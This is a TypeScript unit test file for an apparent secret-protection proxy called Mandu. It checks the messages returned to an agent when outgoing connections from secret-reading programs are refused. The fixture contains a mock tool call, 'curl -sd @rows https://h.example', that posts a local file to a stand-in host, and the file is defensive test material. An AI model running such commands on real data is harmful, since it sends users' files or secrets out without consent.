/**
 * egress-refusal-note.test.ts — confidentiality plan 10 §11.8, "Refused
 * connections": the `refused:` line of the `[mandu:secret]` note, read from
 * the arbiter's callTaint (`refusedEgress`: the program and the kind, never a
 * host). It explains only: a clean result stays clean, a masked one stays
 * masked.
 *
 * Run: npm run test:unit
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { buildSecretNote, refusedEgressLine, rewriteRequest } from "../../src/rewrite-request.js";
import type { MessagesRequest } from "../../src/messages-types.js";
import type { CallTaintWire, ClassifyResult } from "../../src/arbiter-client.js";
import { MockArbiter } from "../helpers/mock-arbiter.js";

const SYM_RE = /^\$MDU:[A-Za-z_][A-Za-z0-9_]*\[[0-9a-f]{4,8}\]/;
const publicVerdict = (): ClassifyResult => ({ trust: "TRUSTED", category: null, reason: "mock", confidentiality: "public" });

function bash(content: string): MessagesRequest {
  return {
    model: "claude-test",
    messages: [
      { role: "user", content: "send it" },
      { role: "assistant", content: [{ type: "tool_use", id: "tu_curl", name: "Bash", input: { command: "curl -sd @rows https://h.example" } }] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: "tu_curl", content }] },
    ],
  };
}
const text = (out: Awaited<ReturnType<typeof rewriteRequest>>): string => String((out.request.messages[2]!.content as Array<{ content: unknown }>)[0]!.content);
const wire = (w: Partial<CallTaintWire>): CallTaintWire => ({ level: null, files: [], apps: [], rule: "secret", mask: [], root: "bash-1", denied: [], evidence: "tree", ...w });

test("buildSecretNote: one refused: line per (program, kind); the approvals hint only where the user can allow it", () => {
  const n = buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "curl", kind: "tainted" }, { app: "wget", kind: "blocked-destination" }] })!;
  assert.deepEqual(n.split("\n"), [
    "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: it had read a secret, and the host is not one that secret is bound to. Tell the user rather than retrying; if it should go, they can allow it on the Mandu dashboard's Approvals page.",
    "[mandu:secret] refused: wget tried to connect out and Mandu refused the connection, nothing was sent: the host is a cloud metadata or link-local address, which Mandu always refuses. Do not retry.",
  ]);
  // The egress proxy relays nothing to this machine (net-proxy
  // blocked-destinations.ts, 2026-10-05): its own kind, nothing to approve.
  const local = buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "curl", kind: "this-machine" }] })!;
  assert.equal(local, "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: the host is this machine, and Mandu's egress proxy does not relay to this machine's own services. Do not retry.");
  // A placeholder a shell emptied (confidentiality.md §7): how to quote it,
  // and to run it again; nothing to approve.
  const expanded = buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "curl", kind: "shell-expanded" }] })!;
  assert.equal(expanded, "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: the request carried a secret's placeholder after a shell had expanded its $MDU to nothing (the placeholder was in double quotes or unquoted in the command or a script), so it held neither the value nor the placeholder. Put the placeholder in single quotes ('$MDU:…') where the shell reads it, in a script you wrote too, and run it again.");
  const unknown = buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "nc", kind: "something-new" }] })!;
  assert.match(unknown, /Mandu could not check the request/);
});

test("a clean call whose connection was refused: the program's own output goes through with the refused: note", async () => {
  const arbiter = new MockArbiter({ classifyFn: publicVerdict, callTaintFn: () => wire({ refusedEgress: [{ app: "curl", kind: "tainted" }] }) });
  const out = await rewriteRequest(bash("curl: (56) CONNECT tunnel failed, response 403"), { arbiter });
  const t = text(out);
  assert.ok(t.startsWith("curl: (56) CONNECT tunnel failed, response 403\n\n[mandu:secret] refused: curl tried to connect out"), t);
  assert.ok(!t.includes("h.example"), "the note names no host");
});

test("a masked call whose connection was refused: still masked whole, and the note says both", async () => {
  const arbiter = new MockArbiter({
    classifyFn: publicVerdict,
    callTaintFn: () => wire({ level: "no-model", files: ["/w/.env"], apps: ["curl"], refusedEgress: [{ app: "curl", kind: "tainted" }] }),
  });
  const out = await rewriteRequest(bash("curl: (56) CONNECT tunnel failed, response 403"), { arbiter });
  const t = text(out);
  assert.match(t, SYM_RE);
  assert.ok(!t.includes("CONNECT tunnel failed"), "the program's output stays masked");
  assert.match(t, /\[mandu:secret\] masked: curl read \/w\/\.env/);
  assert.match(t, /\[mandu:secret\] refused: curl tried to connect out/);
});

test("no refusal: nothing changes (no note on a clean result)", async () => {
  const arbiter = new MockArbiter({ classifyFn: publicVerdict, callTaintFn: () => wire({}) });
  const out = await rewriteRequest(bash("ok"), { arbiter });
  assert.equal(text(out), "ok");
});

// confidentiality.md §4, "A held command's refused connection" (2026-10-12):
// the arbiter filed (or read) the HIGH session's own ask; byte-identical in
// both model proxies.
test("a held command's refused connection: the user was asked (run it again after they allow it once), or blocked it (final)", () => {
  const note = (kind: string) => buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "curl", kind }] })!;
  assert.equal(note("session-asked"), "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: it holds what this session read, and the host is not a place that may go, so Mandu asked the user on its Approvals page. Tell the user it is waiting for their OK there; once they allow it, run the same command again: its next connection to that host goes through, once.");
  assert.equal(note("session-blocked"), "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: it holds what this session read, and the user blocked this session's requests to that host. Do not retry; tell the user.");
});

// Plan 10 §11.8, "A refusal no process is tied to" (2026-10-17): the
// arbiter folds a refusal the egress proxy tied to no process into the calls
// running then ({app: "", kind, unattributed: true}). The line names no
// program and no host, says Mandu could not tell which program opened it,
// and keeps the kind's reason and way out. Byte-identical in both proxies
// (the same strings are pinned in each one's test).
const UNATTR_SECRET = "[mandu:secret] refused: a connection out was refused while this command ran, and nothing was sent; Mandu could not tell which program opened it, so it may not be this command's: programs in this session hold a secret, and while one does Mandu refuses a connection it cannot tie to a program. Tell the user rather than retrying; if it should go, they can allow it on the Mandu dashboard's Approvals page.";
const UNATTR_LOCAL = "[mandu:secret] refused: a connection out was refused while this command ran, and nothing was sent; Mandu could not tell which program opened it, so it may not be this command's: the host is this machine, and Mandu's egress proxy does not relay to this machine's own services. Do not retry.";

test("refusedEgressLine / buildSecretNote: an unattributed refusal names no program and no host, one line per kind", () => {
  assert.equal(refusedEgressLine({ app: "", kind: "unattributed", unattributed: true }), UNATTR_SECRET.replace("[mandu:secret] ", ""));
  const n = buildSecretNote({
    level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "",
    refusedEgress: [{ app: "curl", kind: "tainted" }, { app: "", kind: "unattributed", unattributed: true }, { app: "", kind: "this-machine", unattributed: true }],
  })!;
  const lines = n.split("\n");
  assert.equal(lines.length, 3);
  assert.match(lines[0]!, /^\[mandu:secret\] refused: curl tried to connect out/);
  assert.equal(lines[1], UNATTR_SECRET);
  assert.equal(lines[2], UNATTR_LOCAL);
  // An unattributed entry that somehow carries an app still names none.
  assert.ok(!refusedEgressLine({ app: "evil.example", kind: "symbol", unattributed: true }).includes("evil.example"));
});

// Plan 10 §11.8, "A placeholder as the destination" (2026-10-17): the
// net-proxy refused a request whose host was a $MDU placeholder. The line
// names neither the host nor the symbol (only the generic `$MDU:…`), says
// nothing was sent, and says what to do. Byte-identical in both proxies.
test("refused: a placeholder as the destination: its own words, no host, no symbol; attributed and unattributed", () => {
  assert.equal(
    refusedEgressLine({ app: "curl", kind: "symbol-destination" }),
    "refused: curl tried to connect out and Mandu refused the connection, nothing was sent: its destination was a Mandu placeholder ($MDU:…), and Mandu never turns a placeholder into a host to connect to. Do not retry with a placeholder as the host: write the host itself, and use the placeholder only where the secret's value belongs (a header or the body). If the host itself is the secret, tell the user.",
  );
  assert.equal(
    refusedEgressLine({ app: "", kind: "symbol-destination", unattributed: true }),
    "refused: a connection out was refused while this command ran, and nothing was sent; Mandu could not tell which program opened it, so it may not be this command's: its destination was a Mandu placeholder ($MDU:…), and Mandu never turns a placeholder into a host to connect to. Do not retry with a placeholder as the host: write the host itself, and use the placeholder only where the secret's value belongs (a header or the body). If the host itself is the secret, tell the user.",
  );
  assert.ok(!/\$MDU:[A-Za-z_]/.test(refusedEgressLine({ app: "curl", kind: "symbol-destination" })), "no symbol token");
});

// confidentiality.md §4, the tripwire files no Approvals row (2026-10-17):
// the line for a tripwire refusal offers no approval (none exists for it)
// and says not to retry. Byte-identical in both proxies.
test("a tripwire refusal (kind fingerprint): no Approvals hint, the way out is to tell the user", () => {
  const note = buildSecretNote({ level: "public", files: [], apps: [], rule: "secret", maskWhole: false, denied: [], deniedOnly: false, why: "", refusedEgress: [{ app: "curl", kind: "fingerprint" }] })!;
  assert.equal(note, "[mandu:secret] refused: curl tried to connect out and Mandu refused the connection, nothing was sent: the request carried text Mandu holds as a secret (a registered secret's value, or a line of a result it masked). Do not retry the same request: there is nothing to approve for it. Tell the user what you were sending and where.");
  assert.doesNotMatch(note, /Approvals page/);
});
